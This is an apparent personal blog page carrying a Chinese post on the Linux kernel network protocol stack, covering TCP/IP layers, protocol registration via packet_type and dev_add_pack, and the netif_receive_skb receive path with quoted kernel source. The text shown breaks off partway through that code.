<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="Pwn进你的心">
<meta property="og:url" content="http://example.com/page/16/index.html">
<meta property="og:site_name" content="Pwn进你的心">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="yhellow">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/page/16/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>Pwn进你的心</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Pwn进你的心</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/02/%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%EF%BC%9A%E5%8D%8F%E8%AE%AE%E6%A0%88/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/11/02/%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%EF%BC%9A%E5%8D%8F%E8%AE%AE%E6%A0%88/" class="post-title-link" itemprop="url">网络相关知识：协议栈</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-11-02 18:48:18 / Modified: 18:53:06" itemprop="dateCreated datePublished" datetime="2022-11-02T18:48:18+08:00">2022-11-02</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>8.1k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>7 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>TCP/IP 协议栈简述</strong> </p>
<p>TCP/IP 协议栈是一系列网络协议的总和，是构成网络通信的核心骨架，采用4层结构，分别是：</p>
<ul>
<li>应用层：<ul>
<li>向用户态程序提供网络接口</li>
<li>例如：域名系统DNS协议、HTTP超文本传送协议、Telnet远程登录协议、SNMP简单网络管理协议</li>
</ul>
</li>
<li>传输层：<ul>
<li>位于通信部分的最高层，用户功能的最底层，用于为运行在不同主机上的进程之间提供逻辑通信</li>
<li>例如：传输控制协议TCP - Transmission Control Protocol，用户数据报协议UDP - User Datagram Protocol</li>
</ul>
</li>
<li>网络层：<ul>
<li>进一步管理网络中的数据通信，将数据从源端经过若干中间节点传送到目的端</li>
<li>例如：ARP协议，IP协议，ICMP协议，IGMP协议</li>
</ul>
</li>
<li>链路层：<ul>
<li>提供透明可靠的数据传送基本服务</li>
<li>例如：以太网协议</li>
</ul>
</li>
</ul>
<p>梳理一下每层模型的职责：</p>
<ul>
<li>链路层：对“0”和“1”进行分组，定义数据帧，确认主机的物理地址，传输数据</li>
<li>网络层：定义IP地址，确认主机所在的网络位置，并通过IP进行MAC寻址，对外网数据包进行路由转发</li>
<li>传输层：定义端口，确认主机上应用程序的身份，并将数据包交给对应的应用程序</li>
<li>应用层：定义数据格式，并按照对应的格式解读数据</li>
</ul>
<p><strong>网络协议的注册/注销</strong></p>
<p>协议在内核中用 <code>packet_type</code> 来表示，其拥有不同的容器：</p>
<ul>
<li>每个协议在系统初始化或者相应模块加载的时候添加到内核中的一个大小为16的哈希表 <code>ptype_base</code> 中，其中哈希表中的每个元素都是一个双向链表：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">ptype_base</span>[<span class="title">PTYPE_HASH_SIZE</span>] __<span class="title">read_mostly</span>;</span> <span class="comment">/* 保存所有支持的3层协议(网际协议)处理函数的地方 */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>另一种协议容器是 <code>ptype_all</code>，它直接就是一个双向链表：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>	<span class="title">ptype_all</span>;</span> <span class="comment">/* 保存所有协议处理回调的地方(设备无关) */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>还有一种协议容器是 <code>struct net_device</code> 中的一个条目，也是一个双向链表：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">net_device</span> &#123;</span></span><br><span class="line">    ......</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>	<span class="title">ptype_all</span>;</span> <span class="comment">/* 保存所有协议处理回调的地方(设备有关) */</span></span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>添加协议的 API 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dev_add_pack</span><span class="params">(struct packet_type *pt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">head</span> =</span> ptype_head(pt);</span><br><span class="line"></span><br><span class="line">	spin_lock(&amp;ptype_lock);</span><br><span class="line">	list_add_rcu(&amp;pt-&gt;<span class="built_in">list</span>, head); </span><br><span class="line">	spin_unlock(&amp;ptype_lock);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(dev_add_pack);</span><br></pre></td></tr></table></figure>
<p>其中需要传入的 <code>packet_type</code> 结构体用于描述一个协议：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">packet_type</span> &#123;</span></span><br><span class="line">	__be16			type;	<span class="comment">/* This is really htons(ether_type). */</span></span><br><span class="line">	<span class="keyword">bool</span>			ignore_outgoing;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">net_device</span>	*<span class="title">dev</span>;</span>	<span class="comment">/* NULL is wildcarded here */</span></span><br><span class="line">	<span class="keyword">int</span>			(*func) (struct sk_buff *,</span><br><span class="line">					 struct net_device *,</span><br><span class="line">					 struct packet_type *,</span><br><span class="line">					 struct net_device *);</span><br><span class="line">	<span class="keyword">void</span>			(*list_func) (struct list_head *,</span><br><span class="line">					      struct packet_type *,</span><br><span class="line">					      struct net_device *);</span><br><span class="line">	<span class="keyword">bool</span>			(*id_match)(struct packet_type *ptype,</span><br><span class="line">					    struct sock *sk);</span><br><span class="line">	<span class="keyword">void</span>			*af_packet_priv;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>	<span class="title">list</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>type</code>：协议代码，表明了协议类型 </li>
<li><code>dev</code>：设备，指明了在哪个设备上使能该协议（<code>dev</code> 将 NULL 视为通配符，表示任意设备）</li>
<li><code>func</code>：对应协议的 Handler（处理程序，例如：在网卡收到数据后，<code>netif_receive_skb</code> 将会根据 <code>skb-&gt;protocol</code> 来调用相应的 func 来处理 skb）</li>
<li><code>af_packet_priv</code>：为 PF_PACKET 类型的 socket 使用，指向该 <code>packet_type</code> 的创建者相关的 sock 数据结构 </li>
<li><code>list</code>：协议链表头</li>
</ul>
<p>因此，协议的注册由两步完成：</p>
<ul>
<li>对 <code>packet_type</code> 进行初始化</li>
<li>调用 <code>dev_add_pack</code> 把目标协议加入到 <code>ptype_base</code></li>
</ul>
<p>相应的，协议的注销需要调用如下 API：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dev_remove_pack</span><span class="params">(struct packet_type *pt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	__dev_remove_pack(pt);</span><br><span class="line"></span><br><span class="line">	synchronize_net(); <span class="comment">/* 保证在dev_remove_pack返回的时候,这个移除了的packet_type没有在内核中使用 */</span></span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(dev_remove_pack);</span><br></pre></td></tr></table></figure>
<p><strong>数据包的处理流程</strong></p>
<p>对于 <code>ptype_base</code> 和 <code>ptype_all</code> 两个类型的协议 Container(容器)，协议 Handler 的调用方法是相似的：</p>
<ul>
<li>遍历其中的双向链表，直到找到了符合条件的 <code>packet_type</code></li>
<li>可以使用 <code>deliver_skb</code> 间接调用 <code>packet_type-&gt;func</code></li>
<li>或者直接调用 <code>packet_type-&gt;func</code></li>
</ul>
<p><code>ptype_base</code> 和 <code>ptype_all</code> 的不同之处在于：</p>
<ul>
<li><code>ptype_all</code> 本身就是一个双向链表，可以直接遍历</li>
<li><code>ptype_base</code> 则是一个包含了双向链表的哈希表， 在遍历之前需要根据 <code>skb-&gt;protocol</code> 来计算找到待遍历的双向链表</li>
</ul>
<p>当网卡收到数据包后，它会将数据包从网卡硬件缓存转移到服务器内存中（具体为 <code>sk_buffer</code>），然后触发一个中断来通知内核进行处理</p>
<p>内核会执行如下函数来处理 <code>sk_buffer</code> 中的数据包：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">netif_receive_skb</span><span class="params">(struct sk_buff *skb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	trace_netif_receive_skb_entry(skb);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> netif_receive_skb_internal(skb);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(netif_receive_skb);</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">netif_receive_skb_internal</span><span class="params">(struct sk_buff *skb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">	net_timestamp_check(netdev_tstamp_prequeue, skb); <span class="comment">/* 检查timestamp */</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (skb_defer_rx_timestamp(skb))</span><br><span class="line">		<span class="keyword">return</span> NET_RX_SUCCESS;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (static_branch_unlikely(&amp;generic_xdp_needed_key)) &#123;</span><br><span class="line">		<span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">		preempt_disable();</span><br><span class="line">		rcu_read_lock();</span><br><span class="line">		ret = do_xdp_generic(rcu_dereference(skb-&gt;dev-&gt;xdp_prog), skb);</span><br><span class="line">		rcu_read_unlock();</span><br><span class="line">		preempt_enable();</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (ret != XDP_PASS)</span><br><span class="line">			<span class="keyword">return</span> NET_RX_DROP;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	rcu_read_lock(); <span class="comment">/* RCU读锁(读者不受限制,写者阻塞) */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_RPS</span></span><br><span class="line">	<span class="keyword">if</span> (static_key_false(&amp;rps_needed)) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">rps_dev_flow</span> <span class="title">voidflow</span>, *<span class="title">rflow</span> =</span> &amp;voidflow;</span><br><span class="line">		<span class="keyword">int</span> cpu = get_rps_cpu(skb-&gt;dev, skb, &amp;rflow);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (cpu &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">			ret = enqueue_to_backlog(skb, cpu, &amp;rflow-&gt;last_qtail);</span><br><span class="line">			rcu_read_unlock();</span><br><span class="line">			<span class="keyword">return</span> ret;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	ret = __netif_receive_skb(skb);</span><br><span class="line">	rcu_read_unlock();</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>netif_receive_skb_internal</code> 只是对数据包进行了 RPS（增加服务器的负载均衡，优化吞吐率）的处理，然后调用 <code>__netif_receive_skb</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __netif_receive_skb(struct sk_buff *skb)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (sk_memalloc_socks() &amp;&amp; skb_pfmemalloc(skb)) &#123;</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">int</span> noreclaim_flag;</span><br><span class="line">		noreclaim_flag = memalloc_noreclaim_save();</span><br><span class="line">		ret = __netif_receive_skb_one_core(skb, <span class="literal">true</span>);</span><br><span class="line">		memalloc_noreclaim_restore(noreclaim_flag);</span><br><span class="line">	&#125; <span class="keyword">else</span></span><br><span class="line">		ret = __netif_receive_skb_one_core(skb, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>进行简单检查后就调用了 <code>__netif_receive_skb_one_core</code>：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __netif_receive_skb_one_core(struct sk_buff *skb, <span class="keyword">bool</span> pfmemalloc)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">net_device</span> *<span class="title">orig_dev</span> =</span> skb-&gt;dev;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">packet_type</span> *<span class="title">pt_prev</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">	ret = __netif_receive_skb_core(skb, pfmemalloc, &amp;pt_prev);</span><br><span class="line">	<span class="keyword">if</span> (pt_prev)</span><br><span class="line">		ret = pt_prev-&gt;func(skb, skb-&gt;dev, pt_prev, orig_dev); <span class="comment">/* 调用协议处理 */</span></span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>然后调用核心函数 <code>__netif_receive_skb_core</code>，返回对应的 <code>packet_type</code> 并调用 <code>packet_type-&gt;func</code></li>
<li>核心函数 <code>__netif_receive_skb_core</code> 的源码如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __netif_receive_skb_core(struct sk_buff *skb, <span class="keyword">bool</span> pfmemalloc,</span><br><span class="line">				    struct packet_type **ppt_prev)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">packet_type</span> *<span class="title">ptype</span>, *<span class="title">pt_prev</span>;</span></span><br><span class="line">	<span class="keyword">rx_handler_func_t</span> *rx_handler;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">net_device</span> *<span class="title">orig_dev</span>;</span></span><br><span class="line">	<span class="keyword">bool</span> deliver_exact = <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">int</span> ret = NET_RX_DROP;</span><br><span class="line">	__be16 type;</span><br><span class="line"></span><br><span class="line">	net_timestamp_check(!netdev_tstamp_prequeue, skb);</span><br><span class="line"></span><br><span class="line">	trace_netif_receive_skb(skb);</span><br><span class="line"></span><br><span class="line">	orig_dev = skb-&gt;dev;</span><br><span class="line"></span><br><span class="line">	skb_reset_network_header(skb); </span><br><span class="line">	<span class="keyword">if</span> (!skb_transport_header_was_set(skb))</span><br><span class="line">		skb_reset_transport_header(skb);</span><br><span class="line">	skb_reset_mac_len(skb);</span><br><span class="line"></span><br><span class="line">	pt_prev = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">another_round:</span><br><span class="line">	skb-&gt;skb_iif = skb-&gt;dev-&gt;ifindex;</span><br><span class="line"></span><br><span class="line">	__this_cpu_inc(softnet_data.processed);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (skb-&gt;protocol == cpu_to_be16(ETH_P_8021Q) ||</span><br><span class="line">	    skb-&gt;protocol == cpu_to_be16(ETH_P_8021AD)) &#123;</span><br><span class="line">		skb = skb_vlan_untag(skb);</span><br><span class="line">		<span class="keyword">if</span> (unlikely(!skb))</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (skb_skip_tc_classify(skb))</span><br><span class="line">		<span class="keyword">goto</span> skip_classify;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (pfmemalloc)</span><br><span class="line">		<span class="keyword">goto</span> skip_taps;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* ptype_all容器中协议处理(tcpdump抓包就在这里) */</span></span><br><span class="line">	list_for_each_entry_rcu(ptype, &amp;ptype_all, <span class="built_in">list</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (pt_prev)</span><br><span class="line">			ret = deliver_skb(skb, pt_prev, orig_dev);</span><br><span class="line">		pt_prev = ptype;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">	<span class="comment">/* dev-&gt;ptype_all容器中协议处理(和设备有关) */</span></span><br><span class="line">	list_for_each_entry_rcu(ptype, &amp;skb-&gt;dev-&gt;ptype_all, <span class="built_in">list</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (pt_prev)</span><br><span class="line">			ret = deliver_skb(skb, pt_prev, orig_dev);</span><br><span class="line">		pt_prev = ptype;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">skip_taps:</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_NET_INGRESS</span></span><br><span class="line">	<span class="keyword">if</span> (static_branch_unlikely(&amp;ingress_needed_key)) &#123;</span><br><span class="line">		skb = sch_handle_ingress(skb, &amp;pt_prev, &amp;ret, orig_dev);</span><br><span class="line">		<span class="keyword">if</span> (!skb)</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (nf_ingress(skb, &amp;pt_prev, &amp;ret, orig_dev) &lt; <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	skb_reset_tc(skb);</span><br><span class="line">skip_classify:</span><br><span class="line">	<span class="keyword">if</span> (pfmemalloc &amp;&amp; !skb_pfmemalloc_protocol(skb))</span><br><span class="line">		<span class="keyword">goto</span> drop;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 对vlan报文的处理 */</span></span><br><span class="line">	<span class="keyword">if</span> (skb_vlan_tag_present(skb)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (pt_prev) &#123;</span><br><span class="line">			ret = deliver_skb(skb, pt_prev, orig_dev);</span><br><span class="line">			pt_prev = <span class="literal">NULL</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (vlan_do_receive(&amp;skb))</span><br><span class="line">			<span class="keyword">goto</span> another_round;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (unlikely(!skb))</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">	<span 